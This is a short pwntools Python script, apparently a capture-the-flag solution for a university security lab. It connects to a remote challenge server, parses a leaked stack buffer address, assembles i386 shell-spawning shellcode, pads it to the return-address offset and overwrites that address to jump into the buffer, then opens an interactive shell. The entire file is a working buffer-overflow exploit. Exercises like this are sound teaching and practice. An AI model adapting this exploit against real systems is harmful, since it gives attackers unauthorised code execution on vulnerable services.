from pwn import *

context.update(arch='i386', os='linux')

LOCAL = False

if LOCAL:
    p = process("./program")
    gdb.attach(p)
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4001)

# p.sendline(cyclic(150))
# p.interactive()

p.recvuntil(b"Your buffer is ")
buffer = p.recvuntil(b".")[:-1]
buffer = (int(buffer, 16))

shellcode = shellcraft.sh()
shellcode = asm(shellcode)

payload = shellcode + b'\x00' * (cyclic_find('daab') - len(shellcode) - 4)
payload += p32(buffer)

p.sendline(payload)
p.interactive()

